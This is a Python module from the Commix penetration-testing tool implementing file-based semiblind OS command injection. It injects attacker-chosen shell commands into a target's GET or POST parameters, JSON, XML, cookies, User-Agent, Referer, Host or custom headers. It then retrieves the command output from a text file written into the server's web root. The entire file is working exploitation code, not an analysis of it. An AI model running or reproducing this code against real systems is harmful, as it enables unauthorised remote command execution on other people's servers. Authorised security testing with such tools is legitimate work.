#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import time
import json
import string
import random
import base64
from src.utils import menu
from src.utils import settings
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_payloads

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Check if target host is vulnerable.
"""
def injection_test(payload, http_request_method, url):
                      
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    
    # Check if its not specified the 'INJECT_HERE' tag
    #url = parameters.do_GET_check(url)
    
    # Encoding spaces.
    payload = payload.replace(" ","%20")
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    
    target = url.replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    try:
      # Get the response of the request
      response = requests.get_request_response(request)
    except KeyboardInterrupt:
      response = None

  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = _urllib.parse.unquote(parameter)
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
    # Define the POST data    
    if settings.IS_JSON:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
      try:
        data = checks.json_data(data)
      except ValueError:
        pass
    elif settings.IS_XML:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
    else:
      data = parameter.replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))

    # Check if defined extra headers.
    headers.do_check(request)

    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
    
    try:
      # Get the response of the request
      response = requests.get_request_response(request)
    except KeyboardInterrupt:
      response = None

  return response, vuln_parameter

"""
Check if target host is vulnerable. (Cookie-based injection)
"""
def cookie_injection_test(url, vuln_parameter, payload):
  return requests.cookie_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (User-Agent-based injection)
"""
def user_agent_injection_test(url, vuln_parameter, payload):
  return requests.user_agent_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Referer-based injection)
"""
def referer_injection_test(url, vuln_parameter, payload):
  return requests.referer_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Host-based injection)
"""
def host_injection_test(url, vuln_parameter, payload):
  return requests.host_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Custom header injection)
"""
def custom_header_injection_test(url, vuln_parameter, payload):
  return requests.custom_header_injection(url, vuln_parameter, payload)

"""
The main command injection exploitation.
"""
def injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  
  def check_injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    
    # Execute shell commands on vulnerable host.
    if alter_shell :
      payload = fb_payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE) 
    else:
      payload = fb_payloads.cmd_execution(separator, cmd, OUTPUT_TEXTFILE) 

    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    # Whitespace fixation
    payload = payload.replace(" ", whitespace)

    # Perform payload modification
    payload = checks.perform_payload_modification(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL != 0:
      payload_msg = payload.replace("\n", "\\n")
      if settings.COMMENT in payload_msg:
        payload = payload.split(settings.COMMENT)[0].strip()
        payload_msg = payload_msg.split(settings.COMMENT)[0].strip()
      debug_msg = "Executing the '" + cmd.split(settings.COMMENT)[0].strip() + "' command. "
      sys.stdout.write(settings.print_debug_msg(debug_msg))
      sys.stdout.flush()
      output_payload = "\n" + settings.print_payload(payload)
      if settings.VERBOSITY_LEVEL != 0:
        output_payload = output_payload + "\n" 
      sys.stdout.write(output_payload)

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      response = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      response = user_agent_injection_test(url, vuln_parameter, payload)
      
    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      response = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined host with "INJECT_HERE" tag
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
      response = host_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      response = custom_header_injection_test(url, vuln_parameter, payload)

    else:
      # Check if defined method is GET (Default).
      if http_request_method == "GET":
        # Check if its not specified the 'INJECT_HERE' tag
        #url = parameters.do_GET_check(url)
        payload = payload.replace(" ","%20")
        target = url.replace(settings.INJECT_TAG, payload)
        vuln_parameter = ''.join(vuln_parameter)
        request = _urllib.request.Request(target)
        # Check if defined extra headers.
        headers.do_check(request)        
        # Get the response of the request
        response = requests.get_request_response(request) 

      else :
        # Check if defined method is POST.
        parameter = menu.options.data
        parameter = _urllib.parse.unquote(parameter)
        # Check if its not specified the 'INJECT_HERE' tag
        parameter = parameters.do_POST_check(parameter)
        # Define the POST data  
        if settings.IS_JSON:
          data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
          try:
            data = checks.json_data(data)
          except ValueError:
            pass
        elif settings.IS_XML:
          data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
        else:
          data = parameter.replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))
          
        # Check if defined extra headers.
        headers.do_check(request)        
          
        # Get the response of the request
        response = requests.get_request_response(request)
    return response

  # Do the injection check
  response = check_injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  return response

"""
Find the URL directory.
"""
def injection_output(url, OUTPUT_TEXTFILE, timesec):

  def custom_web_root(url, OUTPUT_TEXTFILE):
    path = _urllib.parse.urlparse(url).path
    if path.endswith('/'):
      # Contract again the url.
      scheme = _urllib.parse.urlparse(url).scheme
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE
    else:
      try:
        path_parts = [non_empty for non_empty in path.split('/') if non_empty]
        count = 0
        for part in path_parts:        
          count = count + 1
        count = count - 1
        last_param = path_parts[count]
        output = url.replace(last_param, OUTPUT_TEXTFILE)
        if "?" and ".txt" in output:
          try:
            output = output.split("?")[0]
          except:
            pass  
      except IndexError:
        output = url + "/" + OUTPUT_TEXTFILE
        
    return output

  if menu.options.web_root:
    # Check for Apache server root directory.
    if "/var/www/" in menu.options.web_root:
      path = menu.options.web_root.replace("/var/www/", "/")
      if "html/" in menu.options.web_root:
        path = path.replace("html/", "")
      # Contract again the url. 
      scheme = _urllib.parse.urlparse(url).scheme
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE
    # Check for Nginx server root directory.  
    elif "/usr/share/" in menu.options.web_root:
      path = menu.options.web_root.replace("/usr/share/", "/")
      if "html/" in menu.options.web_root:
        path = path.replace("html/", "")
      elif "www/" in menu.options.web_root:
        path = path.replace("www/", "")
      # Contract again the url. 
      scheme = _urllib.parse.urlparse(url).scheme
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE
    else:
      output = custom_web_root(url, OUTPUT_TEXTFILE)
  else:
      output = custom_web_root(url, OUTPUT_TEXTFILE)

  return output
  
"""
Command execution results.
"""
def injection_results(url, OUTPUT_TEXTFILE, timesec):

  #Find the directory.
  output = injection_output(url, OUTPUT_TEXTFILE, timesec)

  # Check if defined extra headers.
  request = _urllib.request.Request(output)
  headers.do_check(request)

  # Evaluate test results.
  try:
    output = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
    shell = output.read().rstrip().lstrip()
    #shell = [newline.replace("\n"," ") for newline in shell]
    if settings.TARGET_OS == "win":
      shell = [newline.replace("\r","") for newline in shell]
      #shell = [space.strip() for space in shell]
      shell = [empty for empty in shell if empty]
  except _urllib.error.HTTPError as e:
    if str(e.getcode()) == settings.NOT_FOUND_ERROR:
      shell = ""
  return shell

# eof